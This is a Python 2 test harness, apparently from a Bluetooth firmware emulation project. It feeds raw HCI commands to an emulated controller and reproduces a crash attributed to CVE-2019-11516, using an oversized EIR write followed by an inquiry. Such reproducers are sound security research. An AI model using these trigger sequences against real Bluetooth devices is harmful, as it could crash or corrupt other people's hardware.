import os
import sys
from subprocess import Popen, PIPE, STDOUT
from binascii import hexlify, unhexlify


def hci_read_event(fd):
    event = fd.read(1)
    if ord(event[0]) == 0x04: #HCI Event
        event += fd.read(2)
        event += fd.read(ord(event[2]))

    else:
        raise

    return event

def hci_test(cmd):
    print "Running: %s" % cmd
    p = Popen(["bash", "-c", cmd], stdin=PIPE, stdout=PIPE)

    print "Testing reset"
    p.stdin.write(unhexlify("01030c00"))
    p.stdin.flush()
    assert hexlify(hci_read_event(p.stdout)) == "040e0401030c00"

    print "Write EIR"
    p.stdin.write(unhexlify("01520cf100" + "42"*0xf0))
    p.stdin.flush()
    assert hexlify(hci_read_event(p.stdout)) == "040e0401520c00"

    print "Read EIR"
    p.stdin.write(unhexlify("01510c00"))
    p.stdin.flush()
    assert hexlify(hci_read_event(p.stdout)) == "040ef501510c0000"+"42"*0xf0

    print "Enable lescan"
    p.stdin.write(unhexlify("010c20020101"))
    p.stdin.flush()
    assert hexlify(hci_read_event(p.stdout)) == "040e04010c2000"

    assert hexlify(hci_read_event(p.stdout))[:4] == "043e" #LE Scan Result
    print "Got scan result"

    print "Disable lescan"
    p.stdin.write(unhexlify("010c20020001"))
    p.stdin.flush()
    while hexlify(hci_read_event(p.stdout)) != "040e04010c2000":
        pass

    print "Run Inquiry"
    p.stdin.write(unhexlify("01010405338b9e0000"))
    p.stdin.flush()
    assert hexlify(hci_read_event(p.stdout)) == "040f0400010104"

    print "Waiting for crash (CVE-2019-11516)"
    while True:
        try:
            print "Got Result:", hexlify(hci_read_event(p.stdout))
        except:
            break

hci_test("qemu-arm projects/"+sys.argv[1]+"/gen/hci_test.exe 2>/dev/null")
